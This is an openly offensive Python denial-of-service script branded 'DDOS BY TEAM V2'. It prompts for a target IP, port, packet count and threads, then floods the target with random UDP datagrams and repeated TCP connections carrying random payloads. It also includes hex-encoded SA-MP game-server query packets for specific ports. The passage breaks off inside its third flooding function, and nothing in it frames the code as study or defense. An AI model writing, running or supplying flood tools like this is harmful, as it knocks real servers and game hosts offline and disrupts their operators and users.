import random
import threading
import codecs
import struct
import time
import socket
import sys
import os


print("\033[92m")
print("""
    Tools by Mi Dou

┏━━━┳━━━┳━━━┳━━━┓
┗┓┏┓┣┓┏┓┃┏━┓┃┏━┓┃
╋┃┃┃┃┃┃┃┃┃╋┃┃┗━━┓
╋┃┃┃┃┃┃┃┃┃╋┃┣━━┓┃
┏┛┗┛┣┛┗┛┃┗━┛┃┗━┛┃
┗━━━┻━━━┻━━━┻━━━┛
┏━━┳┓╋╋┏┓
┃┏┓┃┗┓┏┛┃
┃┗┛┗┓┗┛┏┛
┃┏━┓┣┓┏┛
┃┗━┛┃┃┃
┗━━━┛┗┛
▀▀█▀▀ ▒█▀▀▀ ░█▀▀█ ▒█▀▄▀█ 　 
░▒█░░ ▒█▀▀▀ ▒█▄▄█ ▒█▒█▒█ 　 
░▒█░░ ▒█▄▄▄ ▒█░▒█ ▒█░░▒█ 　 

▒█░░▒█ █▀█ 
░▒█▒█░ ░▄▀ 
░░▀▄▀░ █▄▄
     DDOS\033[92m BY\033[92m TEAM\033[92m V2\033[92m §
                             

""")
print("\033[92m DEV# :\033[92m MI Dou \033[92m  ")
print("password : TEAM V 2 FTW  § ")

ip = str(input("  IP/HOST:"))
port = int(input("  PORT/HOST:"))
choice = str(input("  ATTACK BY TEAM V2? (Y/N):"))
times = int(input(" PACKETS:"))
threads = int(input(" THREADS::"))
fake_ip = '182.21.20.32'
#Starting Attacking
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]
def run():
	data = random._urandom(1460)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ")
		except:
			print("[!] DOWN IP V2 FTW")

def run2():
	data = random._urandom(1204)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"DOWN IP V2 FTW")
		except:
			s.close()
			print("[*] DOWN IP V2 FTW")
            

def run3():
	data = random._urandom(999)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" DOWN IP V2 FTW")
		except:
			s.close()